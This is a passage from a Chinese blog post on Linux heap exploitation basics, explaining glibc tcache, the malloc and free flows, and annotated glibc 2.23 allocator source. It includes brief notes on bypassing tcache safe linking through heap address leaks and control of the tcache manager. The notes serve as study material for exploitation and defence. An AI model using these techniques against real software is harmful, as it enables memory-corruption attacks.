<p><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 <code>chunk</code> 的数目，每条链上最多可以有 7 个 <code>chunk</code> 。注意指针指向的位置是 <code>fd</code> 指针，这一点与 fast bin 不同。</p>
<p>结构如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/06577694365bfca457c02a0664f6d368.png"
                      alt="在这里插入图片描述"
                ><br>stash 机制：<br>当申请的大小在 <code>tcache</code> 范围的 <code>chunk</code> 在 <code>tcache</code> 中没有，此时 ptmalloc 会在其他 <code>bin</code> 里面找，如果找到了会将该 <code>chunk</code> 放到 <code>tcache</code> 中，直到 <code>tcache</code> 填满，最后直接返回找到的 <code>chunk</code> 或是从 <code>tcache</code> 中取出并返回。</p>
<p>安全检查：</p>
<ul>
<li>tcache key（only libc2.29 and up）：自 glibc2.29 版本起 <code>tcache</code> 新增了一个 key 字段，该字段位于 <code>chunk</code> 的 bk 字段，值为 <code>tcache</code> 结构体的地址，若 <code>free()</code> 检测到 <code>chunk-&gt;bk == tcache</code> 则会遍历 <code>tcache</code> 查找对应链表中是否有该 <code>chunk</code><br>最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</li>
<li>Safe linking 机制（only glibc2.32 and up）：与 fast bin 类似。<br>绕过方法：<ul>
<li>在 <code>tcache</code> 的一个 <code>entry</code> 中放入第一个 <code>chunk</code> 时，其同样会对该 <code>entry</code> 中的 “<code>chunk</code>” （NULL）进行异或运算后写入到将放入 <code>tcache</code> 中的 <code>chunk</code> 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的 <code>fd</code> 字段，便能够直接获得未经异或运算的堆上相关地址（右移 12 位）</li>
<li>在 <code>tcache-&gt;entry</code> 中存放的仍是未经加密过的地址，若是我们能够控制 <code>tcache</code> 管理器则仍可以在不知道堆相关地址时进行任意地址写。</li>
</ul>
</li>
</ul>
<h1 id="关键过程"><a href="#关键过程" class="headerlink" title="关键过程"></a>关键过程</h1><p>仅简要介绍大致过程，具体细节最好还是查看 libc 源码。</p>
<h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><ul>
<li>首先在 _libc_malloc 函数中先判断 __malloc_hook 函数指针是否为空，如果不为空则调用 __malloc_hook 函数。</li>
<li>如果存在 tcache 且有相应大小的 chunk 则将其从 tcache 中取出并返回结果。</li>
<li>调用 _int_malloc 函数。<ul>
<li>首先把申请的内存的字节数转化为 chunk 的大小。</li>
<li>如果 arena 未初始化 ，则调用 sysmalloc 向系统申请内存，然后将获取的 chunk 返回。</li>
<li>如果申请的 chunk 大小不超过 fast bin 的最大值，则尝试从对应的 fast bin 的头部获取 chunk 。在获取到 chunk 后，如果对应的 fast bin 还有 chunk 并且大小在 tcache 范围就将它们依次从头结点取出放到 tcache 中，直到把 tcache 放满。最后将申请到的 chunk 返回。</li>
<li>如果申请的 chunk 在 small bin 大小范围则进行与 fast bin 一样的操作，只不过这次取 chunk 是依次从链表尾部取。</li>
<li>如果申请的 chunk 在 large bin 大小范围则调用 malloc_consolidate 函数将 fast bin 中的 chunk 合并后放入 unsorted bin 。</li>
<li>循环进行如下操作：<ul>
<li>循环取 unsorted bin 最后一个 chunk 。<ul>
<li>如果用户的请求为 small bin chunk，那么我们首先考虑 last remainder，如果当前 chunk 是 last remainder ，且 last remainder 是 unsorted bin 中的唯一一个 chunk ， 并且 last remainder 的大小分割后还可以作为一个 chunk，则从 last reminder 中切下一块内存返回。</li>
<li>如果 chunk 的大小恰好等于申请的 chunk 大小，则如果该内存大小在 tcache 范围且 tcache 没有满，则先将其放入 tcache，之后会考虑从 tcache 中找 chunk 。否则直接将找到的 chunk 返回。</li>
<li>根据 chunk 的大小将其放入 small bin 或 large bin 中。对于 small bin 直接从链表头部加入；对于 large bin，首先特判加入链表尾部的情况，如果不在链表尾部则从头部遍历找位置，如果 large bin 中有与加入的 chunk 大小相同的 chunk ，则加到第一个相等 chunk 后面，否则加到合适位置后还需要更新 nextsize 指针。</li>
<li>尝试从 tcache 找 chunk 。</li>
<li>如果循环超过 10000 次则跳出循环。</li>
</ul>
</li>
<li>尝试从 tcache 找 chunk 。</li>
<li>如果申请 chunk 大小不在 small bin 范围，则从后往前遍历对应 large bin ，找到第一个不小于申请 chunk 大小的 chunk 。为了 unlink 时避免修改 nextsize 的操作，如果存在多个合适的 chunk 则选择第二个 chunk 。如果选取的 chunk 比申请的 chunk 大不少于 MINSIZE ，则需要将多出来的部分切出来作为 remainder ，并将其加入 unsorted bin 头部。然后将获取的 chunk 返回。</li>
<li>找一个 chunk 范围比申请 chunk 大的非空 bin 里面找最后一个 chunk ，这个过程用 binmap 优化，同时也可以更新 binmap 的状态。这个 chunk 上切下所需的 chunk ，剩余部分放入 unsorted bin 头部。然后将获取的 chunk 返回。</li>
<li>如果 top chunk 切下所需 chunk 后剩余部分还是不小于 MINSIZE 则从top chunk 上切下所需 chunk 返回。</li>
<li>如果 fast bins 还有 chunk 则调用 malloc_consolidate 合并 fast bin 中的 chunk 并放入 unsorted bin 中，然后继续循环。</li>
<li>最后 sysmalloc 系统调用向操作系统申请内存分配 chunk 。<ul>
<li>如果 arena 没有初始化或者申请的内存大于 mp_.mmap_threshold，并且 mmap 的次数小于最大值，则使用 mmap 申请内存。然后检查一下是否 16 字节对齐然后更新 mmap 次数和 mmap 申请过的最大内存大小后就将 chunk 返回。</li>
<li>如果 arena 没有初始化就返回 0</li>
<li>对之前的 top chunk 进行检查，如果是 dummy top 的话，因为是用 unsorted bin 表示的，因此 top chunk 的大小需要是 0 。否则堆的大小应该不小于 MINSIZE，并且前一个堆块应该处于使用中，并且堆的结束地址应该是页对齐的，由于页对齐的大小默认是 0x1000，所以低 12 个比特需要为 0。除此之外，top chunk 大小必须比申请 chunk 大小加上 MINSIZE 要小。</li>
<li>如果 arena 不是 main arena<ul>
<li>尝试将 top chunk 所在的 heap 扩展大小，如果成功则更新 arena 记录的内存总大小 system_mem 和 top chunk 大小。</li>
<li>尝试申请一个新的 heap 。设置新的 heap 以及 arena 的参数并且将原来的 top chunk 先从尾部切下 2 个 0x10 大小的 chunk ，剩余部分如果不小于 MINSIZE 则将其释放掉。</li>
<li>否则，如果前面没有执行到 mmap 申请 chunk 的分支就尝试执行。</li>
</ul>
</li>
<li>如果 arena 是 main arena<ul>
<li>计算需要获取的内存大小。需要获取的内存大小等于申请的 chunk 大小加上 0x20000 和 MINSIZE 。如果堆空间连续，则可以再减去原来内存的大小。然后将需要获取的内存大小与页大小对齐。</li>
<li>sbrk 扩展内存如果成功则会尝试调用一个 hook 函数，否则 mmap 申请内存，然后 brk 移到申请的内存处并设置堆不连续参数。</li>
<li>如果成功获取到内存，则更新 arena 记录的内存总大小 system_mem 和 sbrk_base。之后对一系列的情况进行处理，在这期间，之前的 top chunk 会被从尾部切下两个 0x10 大小的chunk，剩余部分如果不小于 MINSIZE 则将其释放掉。</li>
</ul>
</li>
<li>最后从新获取的 top chunk 上切下所需的 chunk 并返回。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><ul>
<li>首先在 __libc_free 函数中先判断 __free_hook 函数指针是否为空，如果不为空则调用 __free_hook 函数。</li>
<li>如果 chunk 是 mmap 申请的，则调用 munmap_chunk 释放。</li>
<li>调用 _int_free 函数 <ul>
<li>如果释放的 chunk 大小在 tcache 范围且对应的 tcache 没有满，则直接放到 tcache 中然后返回。</li>
<li>如果在 fast bin 范围则加入到 fast bin 头部并返回。</li>
<li>如果不是 mmap 申请的内存<ul>
<li>如果与释放 chunk 相邻的前一个 chunk 是空闲的，则将前一个 chunk 从 bin 中取出和释放 chunk 合并。</li>
<li>如果与释放 chunk 相邻的后一个 chunk 不是 top chunk<ul>
<li>如果与释放 chunk 相邻的后一个 chunk 是空闲的，则将其从 bin 中取出和释放 chunk 合并，否则将其 PREV_INUSE 位置 0</li>
<li>将释放的 chunk 加入到 unsorted bin 头部。</li>
</ul>
</li>
<li>否则将其合并到 top chunk</li>
<li>如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD 就向系统返还内存</li>
</ul>
</li>
<li>否则调用 munmap_chunk 释放 chunk</li>
</ul>
</li>
</ul>
<h1 id="源码注释（glibc-2-23）"><a href="#源码注释（glibc-2-23）" class="headerlink" title="源码注释（glibc-2.23）"></a>源码注释（glibc-2.23）</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="comment">//用于保存指向分配区的指针</span></span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">//用于保存获得的mem指针:chunk_addr + 0x10</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取 __malloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="comment">// 如果 __malloc_hook 不为 NULL 则调用 __malloc_hook ，参数为申请的内存大小。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// 获取本线程对应的 thread_arena ，即 malloc_state 结构体。</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// 调用 _int_malloc 申请内存</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="comment">// 如果 ar_ptr 不为 NULL 且内存没有申请成功则重新申请一次内存</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      <span class="comment">//获取下一个分配区</span></span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      <span class="comment">//再次调用_int_malloc</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//如果此时分配区指针不为空,释放分配区,这里分配已经结束了</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">// 确保只有 3 种情况，即要么没有申请成功，要么是通过 mmap 获取的内存，要么内存是从当前线程对应的 thread_arena 管理的内存中获取的。</span></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="comment">// 返回申请到的内存。</span></span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="__libc_calloc"></a>__libc_calloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_calloc (<span class="type">size_t</span> n, <span class="type">size_t</span> elem_size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av;</span><br><span class="line">  mchunkptr oldtop, p;</span><br><span class="line">  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line">  <span class="type">void</span> *mem;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> clearsize;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> nclears;</span><br><span class="line">  INTERNAL_SIZE_T *d;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* size_t is unsigned so the behavior on overflow is defined.  */</span></span><br><span class="line">  <span class="comment">// 将需要申请的内存大小转换为以字节为单位</span></span><br><span class="line">  bytes = n * elem_size;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_INTERNAL_SIZE_T \</span></span><br><span class="line"><span class="meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span></span><br><span class="line">  /</span><br><span class="line">  <span class="comment">// 如果 n 和 elem_size 中的任何一个不小于 HALF_INTERNAL_SIZE_T</span></span><br><span class="line">  <span class="comment">// 以 64 位为例，HALF_INTERNAL_SIZE_T = 2^32</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 判断 bytes 是否溢出</span></span><br><span class="line">      <span class="keyword">if</span> (elem_size != <span class="number">0</span> &amp;&amp; bytes / elem_size != n)</span><br><span class="line">        &#123;</span><br><span class="line">          __set_errno (ENOMEM);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 获取 __malloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="comment">// 如果 __malloc_hook 不为 NULL 则调用 __malloc_hook，参数为申请内存的大小。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      sz = bytes;</span><br><span class="line">      mem = (*hook)(sz, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  sz = bytes;</span><br><span class="line"></span><br><span class="line">  arena_get (av, sz);</span><br><span class="line">  <span class="keyword">if</span> (av)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check if we hand out the top chunk, in which case there may be no</span></span><br><span class="line"><span class="comment">	 need to clear. */</span></span><br><span class="line">   <span class="comment">// 获取 top chunk 和 top chunk 的大小，这里的 top chunk 的大小是指 top chunk 头之后可以“控制”的的内存大小，具体看后面的解释。</span></span><br><span class="line">   <span class="comment">// 获取这些的原因是无论是 main_arena 控制的 heap 区域通过 sbrk 扩展还是非 main_arena 区域通过对 heap_info 向后扩展受保护的内存区域，</span></span><br><span class="line">   <span class="comment">// 新扩展的内存初始值为 0，即这些内存不需要清空，因此后面会将需要清零的内存大小减去和这部分内存重合的区域，提升程序效率。</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">      oldtop = top (av);</span><br><span class="line">      oldtopsize = chunksize (top (av));</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> MORECORE_CLEARS &lt; 2</span></span><br><span class="line">      <span class="comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena &amp;&amp;</span><br><span class="line">	  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop)</span><br><span class="line">  <span class="comment">// 对于 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap 区域末尾位置</span></span><br><span class="line">	oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">// 对于非 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap_info 受保护区域末尾位置</span></span><br><span class="line">	  heap_info *heap = heap_for_ptr (oldtop);</span><br><span class="line">	  <span class="keyword">if</span> (oldtopsize &lt; (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop)</span><br><span class="line">	    oldtopsize = (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No usable arenas.  */</span></span><br><span class="line">      <span class="comment">// av 为 NULL ，那么之后 _int_malloc 会直接 mmap 获取内存，而 mmap 获取的内存初始值为 0，因此不需要清零。</span></span><br><span class="line">      oldtop = <span class="number">0</span>;</span><br><span class="line">      oldtopsize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用 _int_malloc 获取内存</span></span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 同 __libc_malloc 的 3 种情况</span></span><br><span class="line">  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">          av == arena_for_chunk (mem2chunk (mem)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">      av = arena_get_retry (av, sz);</span><br><span class="line">      mem = _int_malloc (av, sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line">  <span class="comment">// 如果是 mmap 获取的不需要清零，因此只要 chunk 的 size 字段中的 IS_MMAPPED 位置 1 就不会清零。</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> mem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  csz = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="comment">// 如果是从 top chunk 上切下来的则只需要清零 top chunk 范围的内存。</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  <span class="comment">// 清空内存，包括下一个 chunk 的 prev_size 。    </span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  assert (nclears &gt;= <span class="number">3</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="libc-realloc"><a href="#libc-realloc" class="headerlink" title="__libc_realloc"></a>__libc_realloc</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_realloc (<span class="type">void</span> *oldmem, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line">  <span class="comment">// 调用 __realloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">//如果 bytes 为 0 则相当于 free(oldmem)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">//   如果 oldmem 为 NULL 相当于 malloc(bytes)</span></span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 oldmem 对应的 chunk 的指针和大小</span></span><br><span class="line">  <span class="comment">/* chunk corresponding to oldmem */</span></span><br><span class="line">  <span class="type">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line">  <span class="comment">// 寻找 oldp 对应的 arena</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ar_ptr = arena_for_chunk (oldp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="comment">// 检查 oldp + oldsize 是否超过地址上限</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,</span><br><span class="line">		       ar_ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 检查如果申请最小的 chunk 是否会超过地址上限 </span></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是 mmap 得到的内存会单独处理</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *newmem;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line">      <span class="comment">// 如果是 mmap 得到的内存则利用 mremap 系统调用实现 realloc。</span></span><br><span class="line">      <span class="comment">// mremap 会重新分配一块内存并将之前的数据复制到新的内存上。</span></span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      <span class="keyword">if</span> (newp)</span><br><span class="line">        <span class="keyword">return</span> chunk2mem (newp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">      <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">      <span class="comment">// 如果 mremap 获取不到所需的内存则通过 malloc 获取内存，并将原先内存的数据复制过来然后 munmap 将原先的内存释放掉</span></span><br><span class="line">      newmem = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">      munmap_chunk (oldp);</span><br><span class="line">      <span class="keyword">return</span> newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>) mutex_lock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 _int_realloc 调整内存</span></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">// 检查内存分配后的 3 种情况</span></span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 _int_realloc 没有成功则尝试调用 _int_malloc 重新分配内存</span></span><br><span class="line">  <span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      <span class="comment">// 如果 malloc 成功则将数据拷贝后释放原先的内存</span></span><br><span class="line">      <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

